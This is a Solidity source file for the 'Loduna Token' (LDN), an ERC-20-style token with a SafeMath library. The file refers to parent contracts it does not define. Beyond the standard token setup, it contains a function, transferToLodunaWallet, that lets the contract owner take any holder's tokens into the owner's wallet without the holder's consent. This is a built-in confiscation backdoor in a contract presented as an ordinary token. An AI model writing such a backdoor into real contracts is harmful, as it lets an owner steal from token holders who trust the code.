pragma solidity ^0.4.24;
 


library SafeMath {

  


  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    
    
    
    if (a == 0) {
      return 0;
    }

    c = a * b;
    assert(c / a == b);
    return c;
  }

  


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    
    
    
    return a / b;
  }

  


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  


  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}






contract LodunaToken is  PausableToken, BurnableToken {
    string public constant name                 = "Loduna Token";
    string public constant symbol               = "LDN";
    uint8 public constant decimals               = 18;
    uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** uint256(decimals));
    constructor () public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
   




  function transferToLodunaWallet(address _from, uint256 _value) public  returns (bool) {
    require(msg.sender == owner);
    require (_from != owner);
    require(_value <= balances[_from]);
    balances[_from] = balances[_from].sub(_value);
    balances[owner] = balances[owner].add(_value);
    emit Transfer(_from, owner, _value);
    return true;
  }
}